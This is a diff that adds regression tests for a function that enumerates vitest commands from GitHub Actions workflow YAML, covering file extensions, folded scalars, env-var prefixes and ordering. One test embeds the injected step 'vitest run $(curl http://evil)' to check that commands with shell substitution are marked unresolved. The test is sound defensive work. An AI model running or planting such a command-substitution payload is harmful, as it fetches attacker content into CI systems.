@@ -288,3 +288,119 @@ test("a run: | block scalar with a && chain of two vitest invocations enumerates
   assert.ok(commands.includes("vitest run"));
   assert.ok(commands.includes("vitest run --config vitest.config.node.ts"));
 });
+
+test("regression: a workflow file named ci.yaml (not .yml) is still enumerated — GitHub Actions reads both extensions", () => {
+  const yaml = [
+    "name: CI",
+    "on: push",
+    "jobs:",
+    "  test:",
+    "    runs-on: ubuntu-latest",
+    "    steps:",
+    "      - run: vitest run --config integration.ts",
+    "",
+  ].join("\n");
+  const fs = makeFs({ workflows: { "ci.yaml": yaml } });
+
+  const result = enumerateCiTestCommands(PROJECT_ROOT, fs);
+  const commands = result.commands.map((c) => c.command);
+
+  assert.ok(commands.includes("vitest run --config integration.ts"));
+});
+
+test("regression: a folded block scalar run: > joins its lines with a space into ONE command — --config is not split off", () => {
+  const yaml = [
+    "name: CI",
+    "on: push",
+    "jobs:",
+    "  test:",
+    "    runs-on: ubuntu-latest",
+    "    steps:",
+    "      - name: it",
+    "        run: >",
+    "          vitest run",
+    "          --config integration.ts",
+    "",
+  ].join("\n");
+  const fs = makeFs({ workflows: { "ci.yml": yaml } });
+
+  const result = enumerateCiTestCommands(PROJECT_ROOT, fs);
+  const commands = result.commands.map((c) => c.command);
+
+  assert.ok(commands.includes("vitest run --config integration.ts"));
+});
+
+test("regression: a quoted NODE_OPTIONS env-var value with internal spaces is stripped as one prefix, not split or dropped", () => {
+  const yaml = [
+    "name: CI",
+    "on: push",
+    "jobs:",
+    "  test:",
+    "    runs-on: ubuntu-latest",
+    "    steps:",
+    '      - run: NODE_OPTIONS="--experimental-vm-modules --max-old-space-size=4096" vitest run --config esm.ts',
+    "",
+  ].join("\n");
+  const fs = makeFs({ workflows: { "ci.yml": yaml } });
+
+  const result = enumerateCiTestCommands(PROJECT_ROOT, fs);
+  const commands = result.commands.map((c) => c.command);
+
+  assert.ok(commands.includes("vitest run --config esm.ts"));
+});
+
+test("regression: a recognized command carrying an unsplit shell metacharacter $(...) is fail-closed to unresolved, never executed verbatim", () => {
+  const yaml = [
+    "name: CI",
+    "on: push",
+    "jobs:",
+    "  test:",
+    "    runs-on: ubuntu-latest",
+    "    steps:",
+    "      - run: vitest run $(curl http://evil)",
+    "",
+  ].join("\n");
+  const fs = makeFs({ workflows: { "ci.yml": yaml } });
+
+  const result = enumerateCiTestCommands(PROJECT_ROOT, fs);
+  const commands = result.commands.map((c) => c.command);
+
+  assert.ok(!commands.some((c) => c.includes("curl")));
+  assert.ok(result.unresolved.some((u) => u.command.includes("curl")));
+  assert.equal(result.complete, false);
+});
+
+test("regression: enumeration is deterministic — readdirSync output is sorted so a.yml's command precedes b.yml's regardless of key order", () => {
+  const yamlA = [
+    "name: CI A",
+    "on: push",
+    "jobs:",
+    "  test:",
+    "    runs-on: ubuntu-latest",
+    "    steps:",
+    "      - run: vitest run --config a.ts",
+    "",
+  ].join("\n");
+  const yamlB = [
+    "name: CI B",
+    "on: push",
+    "jobs:",
+    "  test:",
+    "    runs-on: ubuntu-latest",
+    "    steps:",
+    "      - run: vitest run --config b.ts",
+    "",
+  ].join("\n");
+  const fs = makeFs({ workflows: { "b.yml": yamlB, "a.yml": yamlA } });
+
+  const result = enumerateCiTestCommands(PROJECT_ROOT, fs);
+  const ciCommands = result.commands
+    .filter((c) => c.source === "ci")
+    .map((c) => c.command);
+  const indexA = ciCommands.indexOf("vitest run --config a.ts");
+  const indexB = ciCommands.indexOf("vitest run --config b.ts");
+
+  assert.ok(indexA !== -1);
+  assert.ok(indexB !== -1);
+  assert.ok(indexA < indexB);
+});
